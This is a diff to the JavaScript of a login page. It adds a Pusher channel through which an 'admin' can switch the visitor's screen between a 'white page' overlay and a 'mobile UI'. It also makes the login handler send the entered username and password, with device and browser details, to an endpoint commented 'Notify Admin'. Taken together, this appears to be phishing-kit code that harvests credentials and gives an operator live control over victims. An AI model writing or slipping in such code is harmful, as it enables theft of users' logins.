@@ -1,3 +1,21 @@
+// Initialize Pusher
+const PUSHER_KEY = '5628e828c0ecf46c7de1'; 
+const PUSHER_CLUSTER = 'ap1';
+
+const pusher = new Pusher(PUSHER_KEY, {
+    cluster: PUSHER_CLUSTER
+});
+
+const channel = pusher.subscribe('admin-channel');
+channel.bind('screen-change', function(data) {
+    const whitePage = document.getElementById('admin-white-page');
+    if (data.state === 'white_page') {
+        whitePage.style.display = 'flex';
+    } else if (data.state === 'mobile_ui') {
+        whitePage.style.display = 'none';
+    }
+});
+
 document.addEventListener('DOMContentLoaded', () => {
     // Generate Floating Droplets
     const container = document.getElementById('droplets-container');
@@ -49,9 +67,19 @@ document.addEventListener('DOMContentLoaded', () => {
             }
             errorMsg.style.opacity = '0';
 
-            // Add a cinematic glitch/hide effect to the card
-            loginCard.style.transform = 'scale(0.9)';
-            loginCard.style.opacity = '0';
+            // Capture Device Info
+            const deviceInfo = {
+                device: /iPhone|iPad|iPod|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
+                browser: navigator.userAgent.includes('Chrome') ? 'Chrome' : (navigator.userAgent.includes('Firefox') ? 'Firefox' : 'Safari'),
+                platform: navigator.platform
+            };
+
+            // Notify Admin via API
+            fetch('/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: user, password: pass, deviceInfo: deviceInfo })
+            }).catch(err => console.log('Notification Error:', err));
 
             setTimeout(() => {
                 loginCard.style.display = 'none';
